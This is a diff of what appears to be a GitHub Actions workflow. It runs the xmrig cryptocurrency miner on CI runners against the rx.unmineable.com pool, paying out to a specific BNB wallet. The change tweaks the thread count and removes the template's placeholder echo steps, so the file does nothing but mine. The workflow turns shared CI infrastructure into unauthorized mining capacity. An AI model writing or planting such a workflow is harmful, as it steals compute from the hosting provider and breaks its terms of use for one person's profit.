@@ -21,16 +21,8 @@ jobs:
     - name: Extract
       run: Expand-Archive xmrig-6.16.4-msvc-win64.zip
     - name: RUNNING
-      run: .\xmrig-6.16.4-msvc-win64\xmrig-6.16.4\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -p x -t 8 -u BNB:0xa300949238f80ac9a6fa627eade4e81e4c73bea1.TOBY
+      run: .\xmrig-6.16.4-msvc-win64\xmrig-6.16.4\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u BNB:0xa300949238f80ac9a6fa627eade4e81e4c73bea1.TOBY -p x -t 4
     - name: DONE
       run: exit
 
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
 
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
